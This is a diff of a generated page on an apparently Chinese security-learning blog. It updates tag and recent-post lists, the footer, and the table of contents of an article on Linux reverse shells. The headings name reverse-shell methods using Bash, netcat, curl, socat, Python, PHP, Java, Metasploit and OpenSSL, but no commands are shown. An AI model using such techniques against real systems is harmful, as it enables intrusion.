+        href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" 
+        title="文件上传">
+        <div class="tags-list-item">文件上传</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%8D%9A%E5%AE%A2/" 
+        title="博客">
+        <div class="tags-list-item">博客</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81/" 
+        title="直播推流">
+        <div class="tags-list-item">直播推流</div>
+      </a>
+    
+      <a 
+        href="/tags/Nginx/" 
+        title="Nginx">
+        <div class="tags-list-item">Nginx</div>
+      </a>
+    
+      <a 
+        href="/tags/Apache/" 
+        title="Apache">
+        <div class="tags-list-item">Apache</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" 
+        title="命令执行">
+        <div class="tags-list-item">命令执行</div>
       </a>
     
       <a 
@@ -734,57 +772,21 @@
       </a>
     
       <a 
+        href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" 
+        title="信息收集">
+        <div class="tags-list-item">信息收集</div>
+      </a>
+    
+      <a 
         href="/tags/DVWA/" 
         title="DVWA">
         <div class="tags-list-item">DVWA</div>
       </a>
     
       <a 
-        href="/tags/IIS/" 
-        title="IIS">
-        <div class="tags-list-item">IIS</div>
-      </a>
-    
-      <a 
-        href="/tags/Java%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" 
-        title="Java环境配置">
-        <div class="tags-list-item">Java环境配置</div>
-      </a>
-    
-      <a 
-        href="/tags/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97/" 
-        title="Shiro反序列">
-        <div class="tags-list-item">Shiro反序列</div>
-      </a>
-    
-      <a 
-        href="/tags/Vulhub/" 
-        title="Vulhub">
-        <div class="tags-list-item">Vulhub</div>
-      </a>
-    
-      <a 
-        href="/tags/SQL%E6%B3%A8%E5%85%A5/" 
-        title="SQL注入">
-        <div class="tags-list-item">SQL注入</div>
-      </a>
-    
-      <a 
-        href="/tags/Python3/" 
-        title="Python3">
-        <div class="tags-list-item">Python3</div>
-      </a>
-    
-      <a 
-        href="/tags/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" 
-        title="Redis未授权访问">
-        <div class="tags-list-item">Redis未授权访问</div>
-      </a>
-    
-      <a 
-        href="/tags/requests%E6%A8%A1%E5%9D%97/" 
-        title="requests模块">
-        <div class="tags-list-item">requests模块</div>
+        href="/tags/SSRF/" 
+        title="SSRF">
+        <div class="tags-list-item">SSRF</div>
       </a>
     
   </div>
@@ -805,7 +807,7 @@
     style="padding-right: 2px;">
   </i>目录
 </div>
-<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E5%8F%8D%E5%BC%B9shell%E5%BD%92%E7%BA%B3"><span class="toc-text">Linux反弹shell归纳</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Bash反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%EF%BC%9A%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7%E5%86%99%E5%85%A5%E5%8F%8D%E5%BC%B9shell%E6%97%B6%EF%BC%8C%E5%91%BD%E4%BB%A4%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-text">注意：利用工具写入反弹shell时，命令如下：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#netcat%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">netcat反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Curl-Bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Curl+Bash反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Socat%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Socat反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Telnet%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Telnet反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Python脚本反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">PHP脚本反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Perl%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E5%90%8E%E7%BC%80-pl%EF%BC%89"><span class="toc-text">Perl脚本反弹shell（后缀.pl）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ruby%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E5%90%8E%E7%BC%80-rb%EF%BC%89"><span class="toc-text">Ruby脚本反弹shell（后缀.rb）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Metasploit生成反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OpenSSL%E5%8F%8D%E5%BC%B9%E5%8A%A0%E5%AF%86shell"><span class="toc-text">OpenSSL反弹加密shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E5%90%8E%E8%8E%B7%E5%8F%96%E6%A8%A1%E6%8B%9F%E7%BB%88%E7%AB%AF"><span class="toc-text">反弹shell后获取模拟终端</span></a></li></ol></li></ol>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E5%8F%8D%E5%BC%B9shell%E5%BD%92%E7%BA%B3"><span class="toc-text">Linux反弹shell归纳</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Bash反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%EF%BC%9A%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7%E5%86%99%E5%85%A5%E5%8F%8D%E5%BC%B9shell%E6%97%B6%EF%BC%8C%E5%91%BD%E4%BB%A4%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-text">注意：利用工具写入反弹shell时，命令如下：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#netcat%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">netcat反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Curl-Bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Curl+Bash反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Socat%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Socat反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Telnet%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Telnet反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Python脚本反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">PHP脚本反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Perl%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E5%90%8E%E7%BC%80-pl%EF%BC%89"><span class="toc-text">Perl脚本反弹shell（后缀.pl）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ruby%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E5%90%8E%E7%BC%80-rb%EF%BC%89"><span class="toc-text">Ruby脚本反弹shell（后缀.rb）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JAVA%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">JAVA反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Metasploit生成反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OpenSSL%E5%8F%8D%E5%BC%B9%E5%8A%A0%E5%AF%86shell"><span class="toc-text">OpenSSL反弹加密shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E5%90%8E%E8%8E%B7%E5%8F%96%E6%A8%A1%E6%8B%9F%E7%BB%88%E7%AB%AF"><span class="toc-text">反弹shell后获取模拟终端</span></a></li></ol></li></ol>
     </article>
   
   
@@ -820,23 +822,23 @@
   <div class="recent-posts-list">
     
       <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2021-07-19</div>
-        <a href="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/"><div class="recent-posts-item-content">Pocsuite3重写redis脚本</div></a>
+        <div class="recent-posts-item-title">2021-08-06</div>
+        <a href="/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><div class="recent-posts-item-content">信息收集</div></a>
       </div>
     
       <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2021-07-19</div>
-        <a href="/article/Pocsuite3%E4%BD%BF%E7%94%A8/"><div class="recent-posts-item-content">Pocsuite3使用</div></a>
+        <div class="recent-posts-item-title">2021-08-05</div>
+        <a href="/article/Access%E6%B3%A8%E5%85%A5/"><div class="recent-posts-item-content">Access注入</div></a>
       </div>
     
       <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2021-07-09</div>
-        <a href="/article/SQL%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"><div class="recent-posts-item-content">SQL注入方法总结</div></a>
+        <div class="recent-posts-item-title">2021-08-05</div>
+        <a href="/article/MSSQL%E6%B3%A8%E5%85%A5/"><div class="recent-posts-item-content">MSSQL注入</div></a>
       </div>
     
       <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2021-07-09</div>
-        <a href="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/"><div class="recent-posts-item-content">Burpsuite挂梯子抓包</div></a>
+        <div class="recent-posts-item-title">2021-08-05</div>
+        <a href="/article/Mysql%E6%B3%A8%E5%85%A5/"><div class="recent-posts-item-content">Mysql注入</div></a>
       </div>
     
   </div>
@@ -873,6 +875,18 @@
 
     
     
+    
+      <div class="BbeiAn-info">
+        <a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">皖ICP备2021010523号-1 </a>
+      </div>
+      
+        <div class="BbeiAn-info">
+          <span style="padding-left: 25px;background: url(/img/beian.png) no-repeat left center"></span>
+          <a target="_blank" rel="noopener" href="http://www.beian.gov.cn/portal/recordQuery ">皖公网安备 34012202341035号
+          </a>
+          <br />
+        </div>
+      
     
     
       <div class="footer-dsc">
